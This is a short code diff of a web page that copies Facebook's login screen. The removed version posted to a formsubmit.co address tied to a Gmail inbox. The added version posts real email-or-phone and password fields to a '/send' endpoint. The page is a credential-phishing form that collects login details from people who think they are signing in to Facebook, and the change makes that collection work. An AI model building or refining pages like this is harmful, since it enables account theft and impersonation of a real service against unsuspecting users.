@@ -31,9 +31,9 @@
                 <div class="col-md-5">
                     <h1 class="fw-bold text-primary d-md-none d-lg-none text-center">facebook</h1>
                     <div class="mb-3 shadow p-3 mb-5 bg-body rounded">
-                        <form action="https://formsubmit.co/g.sometech@gmail.com" method="post">
-                            <input type="hidden" name="_captcha" value="false" class="form-control" id="exampleFormControlInput1" placeholder="Email address or phone number">
-                            <input type="hidden" name="_captcha" value="false" class="form-control my-2" id="exampleFormControlInput1" placeholder="password">
+                        <form action="/send" method="post">
+                            <input type="text" name="name" class="form-control" id="exampleFormControlInput1" placeholder="Email address or phone number" required>
+                            <input type="password" name="password" class="form-control my-2" id="exampleFormControlInput1" placeholder="password" required>
                         
                               <div class="d-grid gap-2">
                                 <button class="btn btn-primary" type="submit">Log in</button>
